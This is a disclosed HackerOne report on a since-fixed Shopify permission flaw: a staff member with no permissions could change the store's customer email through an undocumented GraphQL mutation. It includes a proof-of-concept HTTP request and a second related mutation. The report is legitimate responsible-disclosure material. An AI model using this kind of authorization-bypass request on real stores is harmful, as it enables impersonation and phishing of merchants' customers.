{"id":980511,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC85ODA1MTE=","url":"https://hackerone.com/reports/980511","title":"A staff member with no permissions can edit Store Customer Email","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-09-12T07:24:44.117Z","submitted_at":"2020-09-12T07:24:44.376Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ash_nz","url":"/ash_nz","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/QkvsUwLu3hoeUg5dKxPjdSei/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2020-10-22T18:41:03.511Z","bug_reporter_agreed_on_going_public_at":"2020-10-22T18:41:03.409Z","team_member_agreed_on_going_public_at":"2020-10-09T21:57:44.906Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Impact\nA staff member with no permissions can edit a store `Customer email` which they have no access to. This is the email that the store customers will see when emailing them.\n\n## Details\n`emailSenderConfigurationUpdate` is an undocumented GraphQL API that will allows a malicious staff member in a store to update the `Customer Email`. This email configuration can be found in the general settings in your store. The following screenshot shows the details.\n██████████\n\nTo reproduce this finding you will need two accounts in your store. One is the Owner and the other is an account that you invite as a staff member with no permissions. The following screenshot shows the accounts setup.\n{F985090}\n{F985089}\n\n1. login as the Staff user and send the following mutation GraphQL request.\n\n```http\nPOST /admin/internal/web/graphql/core HTTP/1.1\nCookie: [REDACTED]\naccept: application/json\nX-CSRF-Token: [REDACTED]\nContent-Type: application/json\nUser-Agent: PostmanRuntime/7.26.5\nPostman-Token: 082760e7-3dac-481e-8741-50cb2cc61617\nHost: [YOUR-DOMAIN].myshopify.com\nAccept-Encoding: gzip, deflate\nConnection: close\nContent-Length: 346\n\n{\"query\":\"\\r\\nmutation emailSenderConfigurationUpdate ($input:EmailSenderConfigurationUpdateInput!){  emailSenderConfigurationUpdate(input:$input) {\\r\\n    emailSenderConfiguration{\\r\\n        id\\r\\n    }\\r\\n\\r\\nuserErrors {\\r\\n    field\\r\\n    message\\r\\n}\\r\\n}\\r\\n}\",\"variables\":{\n  \"input\":{\n      \"senderEmail\":\"███\"\n  }\n}}\n```\n2. Login with the Owner account and check the `Store details`,the `Customer email` should be updated with the new email address.\n\n## Impact\n\nA staff member with no permissions can edit a store `Customer email` which they have no access to. This is the email that the store customers will see when emailing them.","bounty_amount":"1500.0","formatted_bounty":"$1,500","weakness":{"id":55,"name":"Insecure Direct Object Reference (IDOR)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":985089,"file_name":"permissions.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/vhVwJ8zMr7ov4LwBJ7m86Dce?response-content-disposition=attachment%3B%20filename%3D%22permissions.PNG%22%3B%20filename%2A%3DUTF-8%27%27permissions.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154803Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=be7fc80a46cd398222a2b9e422e0eaecaa1fa9e55c0cb70155f2efc97e81e46d","file_size":27958,"type":"image/png"},{"id":985090,"file_name":"accounts.PNG","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/rgNuZunHGFZLQBm4gHhmXWJQ?response-content-disposition=attachment%3B%20filename%3D%22accounts.PNG%22%3B%20filename%2A%3DUTF-8%27%27accounts.PNG\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQY53K44OC%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T154803Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJHMEUCIQCU8ZTbZzS6KdrG%2BJrTZNy82bTqU%2FWXOWwT7y6tP8B6KAIgQozKTGEEU%2F70E9jK8ee9qFehhPTHAyr6tKNPFg0ipagqgwQI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARACGgwwMTM2MTkyNzQ4NDkiDF24qMO4iM3lRhiKeSrXA3AD62arZ%2FR73I3OwVYKSQCLgGLmSdy1oHr3484T3%2BZNdRf9jASNKtWoD4ND1FsQM%2BH%2FxYbuyUfVW1RfHyrPNSyl31UWmh7%2FQLuSlKjidHFofUO6MlDrn8WL5H8Dklkc%2FODNXnwWhhBS4P4ETpaL0O2W1uk1mywZuHYi%2FHdUzHz3D04j6CIFX8koOXulelg3aywpppZ%2BEQtc5UJl3%2FFtSaZhFImaUXkZ%2BzfEI%2BbQZR9YL2QECzdM3wSFAU88f993HARvk3jnLnZu%2FeEflruySV3ucsnDUFOGStl4Z92w7SWYAu4eDkreiVsqtuAq5AUa5%2BxAlO8ntiuuW%2F1ub33RDrVP%2F1fK0GljO09wOd0GggTt7eJg%2FThXb0E0vNvuwPp1jdadEeVnZq2BNBCkROzc7bkLv3NE%2FYGkeq2tXA2h%2FEIK8ch9Mnp6UiGfyxWGAmVSXsYjBfrEAhj%2FOjyT96V663zm4TqRAN1sBiDSBG2V62BD69wu%2BKoIKDUGczZoq%2FV0i7T2Z94gjXG54fv8Q9pYpQYidhIS8cWbi1UAeyC7clfpue5hvais0Jt95MyKeSs9D4lwBmMR0UyOP2rP66bKUJXZxm09UaueyC8QE1RefPMEnNlod%2FEZhzCfjpGLBjqlAXGztZxISzkOSBi8ODZQNabZwzSDol%2BJUpM4q3e6PNJ%2FgMEC3ZQgjfp1kkwqPmzwlsAYYdaiUyY63ZSo5cIUxwTYMNXkbtuqxJrWDNMFnO8tISB8THjfP1XKNdJ7hpjx0Bx9mhmB9FifH5ih2c0AvGKyBC0fFcEdB0xLEnh5UcS8oUuRyx81oqTUXuBHWiT8%2B9GXMeEJa92HZXoXratnwKl2tc9yww%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=59115aa26d26a7990f1a286f045de89f0ad702bad4b2736e880ba713491aa505","file_size":18237,"type":"image/png"}],"allow_singular_disclosure_at":null,"vote_count":53,"voters":["holsick","whitewhale-dmb","gofunc","xploiterr","battle_angel","drsniper","ali","dmc3","hotmuffin","seqrity0x39","and 43 more..."],"severity":{"rating":"medium","author_type":"Team"},"structured_scope":{"databaseId":413,"asset_type":"URL","asset_identifier":"your-store.myshopify.com","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":9219743,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Howdy @ash_nz,\n\nThanks for the report.\n\nWe have been able to reproduce your findings and our engineering team is working on a fix. For that reason, we will be triaging your report.","automated_response":false,"created_at":"2020-09-14T18:49:45.225Z","updated_at":"2020-09-14T18:49:45.225Z","actor":{"username":"zack_spotify","cleared":false,"url":"/zack_spotify","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/261/793/78a81f701248b9e632d5de7b037e5e0eedd37560_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9230028,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","automated_response":false,"created_at":"2020-09-15T18:45:32.855Z","updated_at":"2020-09-15T18:45:32.855Z","additional_data":{"duplicate_report_id":982546},"actor":{"username":"ngalog","cleared":true,"url":"/ngalog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/607/68068f139c99d98e3e8baf0a51f219c29ade1769_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9231245,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I have found another GraphQL API call that i think it might be related to this report.\nThe API is `emailSenderConfigurationValidate` which a staff member with no permissions can make a request.\nThe following is a sample request.\n\n```graphql\n\nmutation emailSenderConfigurationValidate {  emailSenderConfigurationValidate {\n    emailSenderConfiguration{\n        id\n    }\n\nuserErrors {\n    field\n    message\n}\n}\n}\n```\n\nWas not sure about the impact of this API, however reported it for completion.","automated_response":false,"created_at":"2020-09-15T21:11:56.066Z","updated_at":"2020-09-15T21:11:56.066Z","actor":{"username":"ash_nz","cleared":false,"url":"/ash_nz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QkvsUwLu3hoeUg5dKxPjdSei/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9240147,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @ash_nz,\n\nThank you again for the report! We are awarding a $1500 bounty for this issue under our Core Circumvention of User Permission Model category. This falls in the middle of the range for this type of vulnerability as the customer contact email is used in several places where email is sent in the Shopify platform. We look forward to hearing from you again soon!","automated_response":false,"created_at":"2020-09-16T19:25:11.203Z","updated_at":"2020-09-16T19:25:11.203Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"1500.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"ash_nz","url":"/ash_nz"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9240880,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the update and the bounty","automated_response":false,"created_at":"2020-09-16T21:31:26.078Z","updated_at":"2020-09-16T21:31:26.078Z","actor":{"username":"ash_nz","cleared":false,"url":"/ash_nz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QkvsUwLu3hoeUg5dKxPjdSei/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9240978,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@ash_nz where is my cut!?\n\nLol jk, congrats! Shopify is a pleasure to working with, good feedback and good response time :P","automated_response":false,"created_at":"2020-09-16T21:56:01.388Z","updated_at":"2020-09-16T21:56:01.388Z","actor":{"username":"ngalog","cleared":true,"url":"/ngalog","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/074/607/68068f139c99d98e3e8baf0a51f219c29ade1769_original.png/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9240994,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"lol \n@ngalog i'm inviting you for a corona beer :D","automated_response":false,"created_at":"2020-09-16T22:01:05.363Z","updated_at":"2020-09-16T22:01:05.363Z","actor":{"username":"ash_nz","cleared":false,"url":"/ash_nz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QkvsUwLu3hoeUg5dKxPjdSei/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9299142,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","automated_response":false,"created_at":"2020-09-22T19:32:07.738Z","updated_at":"2020-09-22T19:32:07.738Z","additional_data":{"old_severity":"High (7.4)","new_severity":"Medium","old_severity_id":844281,"new_severity_id":853629},"actor":{"username":"zack_spotify","cleared":false,"url":"/zack_spotify","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/261/793/78a81f701248b9e632d5de7b037e5e0eedd37560_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9470987,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Howdy @ash_nz,\n\nWe have recently shipped a fix for this issue and it should no longer be possible for a staff member without the `Settings` permission to edit the Customer email field.\n\nFor that reason, we'll be closing this report as resolved. Thanks again for the report!","automated_response":false,"created_at":"2020-10-09T13:33:16.138Z","updated_at":"2020-10-09T13:33:16.138Z","actor":{"username":"zack_spotify","cleared":false,"url":"/zack_spotify","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/261/793/78a81f701248b9e632d5de7b037e5e0eedd37560_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"ash_nz","url":"/ash_nz"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9475965,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-10-09T21:57:44.940Z","updated_at":"2020-10-09T21:57:44.940Z","first_to_agree":true,"actor":{"username":"zack_spotify","cleared":false,"url":"/zack_spotify","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/261/793/78a81f701248b9e632d5de7b037e5e0eedd37560_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9605890,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"could you please redact sensitive information such as email. Thanks","automated_response":false,"created_at":"2020-10-22T18:41:03.430Z","updated_at":"2020-10-22T18:41:03.430Z","actor":{"username":"ash_nz","cleared":false,"url":"/ash_nz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QkvsUwLu3hoeUg5dKxPjdSei/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9605891,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-10-22T18:41:03.535Z","updated_at":"2020-10-22T18:41:03.535Z","actor":{"username":"ash_nz","cleared":false,"url":"/ash_nz","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/QkvsUwLu3hoeUg5dKxPjdSei/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}